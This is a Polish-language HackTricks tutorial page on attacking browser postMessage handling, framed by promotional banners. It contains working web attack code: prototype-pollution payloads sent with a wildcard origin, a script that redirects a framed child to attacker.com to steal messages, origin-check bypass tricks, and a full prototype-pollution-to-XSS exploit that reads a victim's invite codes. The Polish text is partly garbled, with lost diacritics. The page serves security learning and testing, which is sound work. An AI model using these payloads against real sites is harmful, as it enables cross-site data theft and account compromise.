# Luki PostMessage

## Luki PostMessage

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to **dark-web**-owy silnik wyszukiwania, kt贸ry oferuje **darmowe** funkcje sprawdzania, czy firma lub jej klienci zostali **skompromitowani** przez **zoliwe oprogramowanie kradnce informacje**.

Ich g贸wnym celem WhiteIntel jest zwalczanie przej kont i atak贸w ransomware wynikajcych z zoliwego oprogramowania kradncego informacje.

Mo偶esz sprawdzi ich stron internetow i wypr贸bowa ich silnik **za darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

---

## Wylij **PostMessage**

**PostMessage** u偶ywa nastpujcej funkcji do wysyania wiadomoci:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Zauwa偶, 偶e **targetOrigin** mo偶e by '\*' lub adresem URL, na przykad _https://company.com._\
W **drugim scenariuszu** **wiadomo mo偶e by wysana tylko do tego domeny** (nawet jeli pochodzenie obiektu okna jest inne).\
Jeli u偶ywany jest **znak wieloznaczny**, **wiadomoci mog by wysyane do dowolnej domeny**, i zostan wysane do pochodzenia obiektu Window.

### Atakowanie iframe i znaku wieloznacznego w **targetOrigin**

Jak wyjaniono w [**tym raporcie**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), jeli znajdziesz stron, kt贸ra mo偶e by **osadzona w iframe** (bez ochrony `X-Frame-Header`) i kt贸ra **wysya wra偶liw** wiadomo za pomoc **postMessage** u偶ywajc **znaku wieloznacznego** (\*), mo偶esz **zmodyfikowa** **pochodzenie** **iframe** i **ujawni** **wra偶liw** wiadomo do domeny kontrolowanej przez ciebie.\
Zauwa偶, 偶e jeli strona mo偶e by osadzona w iframe, ale **targetOrigin** jest **ustawiony na adres URL, a nie na znak wieloznaczny**, ten **sztuczka nie zadziaa**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Wykorzystanie addEventListener

**`addEventListener`** to funkcja u偶ywana przez JS do zadeklarowania funkcji, kt贸ra **oczekuje na `postMessages`**.\
Zostanie u偶yty kod podobny do poni偶szego:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Zauwa偶 w tym przypadku, jak **pierwsz rzecz**, kt贸r robi kod, jest **sprawdzenie pochodzenia**. Jest to niezwykle **wa偶ne**, g贸wnie jeli strona ma wykona **jakiekolwiek czynnoci wymagajce uwagi** w zwizku z otrzymanymi informacjami (np. zmiana hasa). **Jeli nie sprawdzi si pochodzenia, atakujcy mog zmusi ofiary do wysania dowolnych danych do tych punkt贸w kocowych** i zmieni hasa ofiar (w tym przykadzie).

### Wyliczanie

Aby **znale藕 nasuchiwaczy zdarze** na bie偶cej stronie, mo偶na:

* **Przeszuka** kod JS w poszukiwaniu `window.addEventListener` i `$(window).on` (_wersja JQuery_)
* **Wykona** w konsoli narzdzi deweloperskich: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Przejd藕 do** _Elementy --> Nasuchiwacze zdarze_ w narzdziach deweloperskich przegldarki

![](<../../.gitbook/assets/image (393).png>)

* U偶yj rozszerzenia przegldarki, takiego jak [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) lub [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Te rozszerzenia przegldarki **przechwyc wszystkie wiadomoci** i poka偶 je Tobie.

### Pomijanie sprawdzania pochodzenia

* Atrybut **`event.isTrusted`** jest uwa偶any za bezpieczny, poniewa偶 zwraca `True` tylko dla zdarze generowanych przez autentyczne dziaania u偶ytkownika. Chocia偶 jego poprawne zastosowanie mo偶e by wyzwaniem, jego znaczenie w kontekcie kontroli bezpieczestwa jest istotne.
*   U偶ycie **`indexOf()`** do walidacji pochodzenia w zdarzeniach PostMessage mo偶e by podatne na pominicie. Przykad ilustrujcy t podatno to:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
*   Metoda **`search()`** z `String.prototype.search()` jest przeznaczona do wyra偶e regularnych, a nie do cig贸w znak贸w. Przekazanie czego innego ni偶 wyra偶enie regularne prowadzi do konwersji domylnej na wyra偶enie regularne, co mo偶e sprawi, 偶e metoda bdzie potencjalnie nieskuteczna. Dzieje si tak, poniewa偶 w wyra偶eniach regularnych kropka (.) dziaa jako symbol wieloznaczny, umo偶liwiajc pominicie walidacji przy specjalnie spreparowanych domenach. Na przykad:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* Funkcja **`match()`**, podobnie jak `search()`, przetwarza wyra偶enia regularne. Jeli wyra偶enie regularne jest nieprawidowo zbudowane, mo偶e by podatne na pominicie.
*   Funkcja **`escapeHtml`** ma na celu oczyszczenie wej poprzez unikanie znak贸w. Jednak偶e nie tworzy nowego obiektu uniknitego, ale nadpisuje waciwoci istniejcego obiektu. To zachowanie mo偶e by wykorzystane. W szczeg贸lnoci, jeli obiekt mo偶na manipulowa w taki spos贸b, 偶e jego kontrolowana waciwo nie uznaje `hasOwnProperty`, `escapeHtml` nie bdzie dziaa zgodnie z oczekiwaniami. Przedstawiono to na poni偶szych przykadach:

*   Oczekiwane niepowodzenie:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
*   Pomijanie unikania:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

W kontekcie tej podatnoci obiekt `File` jest szczeg贸lnie podatny ze wzgldu na swoj tylko do odczytu waciwo `name`. Ta waciwo, gdy jest u偶ywana w szablonach, nie jest oczyszczana przez funkcj `escapeHtml`, co prowadzi do potencjalnych zagro偶e dla bezpieczestwa.
* Waciwo `document.domain` w JavaScript mo偶e by ustawiona przez skrypt w celu skr贸cenia domeny, co pozwala na bardziej elastyczn egzekucj polityki tego samego pochodzenia w obrbie tej samej domeny nadrzdnej.

### Pomijanie e.origin == window.origin

Podczas osadzania strony internetowej w **zabezpieczonym iframe** za pomoc %%%%%%, istotne jest zrozumienie, 偶e pochodzenie iframu zostanie ustawione na null. Jest to szczeg贸lnie istotne przy korzystaniu z **atrybut贸w sandbox** i ich wpywu na bezpieczestwo i funkcjonalno.

Poprzez okrelenie **`allow-popups`** w atrybucie sandbox, ka偶de okno popup otwarte z iframu dziedziczy ograniczenia sandboxa swojego rodzica. Oznacza to, 偶e chyba 偶e atrybut **`allow-popups-to-escape-sandbox`** jest r贸wnie偶 uwzgldniony, pochodzenie okna popup jest r贸wnie偶 ustawione na `null`, zgodnie z pochodzeniem iframu.

W rezultacie, gdy otwarte s okna popup w tych warunkach i wiadomo jest wysyana z iframu do popupu za pomoc **`postMessage`**, zar贸wno nadawca, jak i odbiorca maj ustawione pochodzenie na `null`. Ta sytuacja prowadzi do scenariusza, w kt贸rym **`e.origin == window.origin`** jest prawdziwe (`null == null`), poniewa偶 zar贸wno iframe, jak i popup maj tak sam warto pochodzenia `null`.

Aby uzyska wicej informacji, **przeczytaj**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Pomijanie e.source

Mo偶liwe jest sprawdzenie, czy wiadomo pochodzi z tego samego okna, w kt贸rym skrypt nasuchuje (szczeg贸lnie interesujce dla **Skrypt贸w zawartoci z rozszerze przegldarki** w celu sprawdzenia, czy wiadomo zostaa wysana z tej samej strony):
```javascript
// If its not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Mo偶esz zmusi **`e.source`** wiadomoci do bycia nullem, tworzc **iframe**, kt贸ry **wysya** **postMessage** i jest **natychmiast usuwany**.

Aby uzyska wicej informacji, **przeczytaj:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypass nag贸wka X-Frame

Aby przeprowadzi te ataki, idealnie byoby **umieci stron ofiary** w `iframe`. Jednak niekt贸re nag贸wki, takie jak `X-Frame-Header`, mog **zapobiec** temu **zachowaniu**.\
W takich scenariuszach nadal mo偶na u偶y mniej dyskretnego ataku. Mo偶na otworzy now kart do podatnej aplikacji internetowej i komunikowa si z ni:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Kradzie偶 wiadomoci wysanej do dziecka poprzez zablokowanie g贸wnej strony

Na poni偶szej stronie mo偶esz zobaczy, jak mo偶na ukra **wra偶liwe dane postmessage** wysane do **dziecicego iframe'a**, blokujc **g贸wn** stron przed wysaniem danych i wykorzystujc **XSS w dziecku**, aby **wyciec dane** przed ich otrzymaniem:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Kradzie偶 wiadomoci poprzez modyfikacj lokalizacji iframe'a

Jeli mo偶esz osadzi stron internetow bez nag贸wka X-Frame-Options, kt贸ra zawiera inny iframe, mo偶esz **zmieni lokalizacj tego dziecka iframe'a**, wic jeli otrzymuje **postmessage** wysane za pomoc **gwiazdki**, atakujcy mo偶e **zmieni** pochodzenie tego iframe'a na stron **kontrolowan** przez niego i **ukra** wiadomo:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage do Zanieczyszczenia Prototypu i/lub XSS

W przypadkach, gdy dane wysyane za pomoc `postMessage` s wykonywane przez JS, mo偶esz **osadzi** **stron** i **wykorzysta** **zanieczyszczenie prototypu/XSS**, wysyajc exploit za pomoc `postMessage`.

Kilka **bardzo dobrze wyjanionych XSS poprzez `postMessage`** mo偶na znale藕 pod adresem [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Przykad exploitu do wykorzystania **Zanieczyszczenia Prototypu, a nastpnie XSS** za pomoc `postMessage` do `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Dla **wicej informacji**:

* Link do strony o [**zanieczyszczeniu prototypu**](../deserialization/nodejs-proto-prototype-pollution/)
* Link do strony o [**XSS**](../xss-cross-site-scripting/)
* Link do strony o [**zanieczyszczeniu prototypu po stronie klienta do XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referencje

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Aby wiczy: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana **dark-web**, kt贸ra oferuje **darmowe** funkcje sprawdzania, czy firma lub jej klienci zostali **skompromitowani** przez **zoliwe oprogramowanie kradnce dane**.

Ich g贸wnym celem WhiteIntel jest zwalczanie przej kont i atak贸w ransomware wynikajcych z zoliwego oprogramowania kradncego informacje.

Mo偶esz odwiedzi ich stron internetow i wypr贸bowa ich silnik za **darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
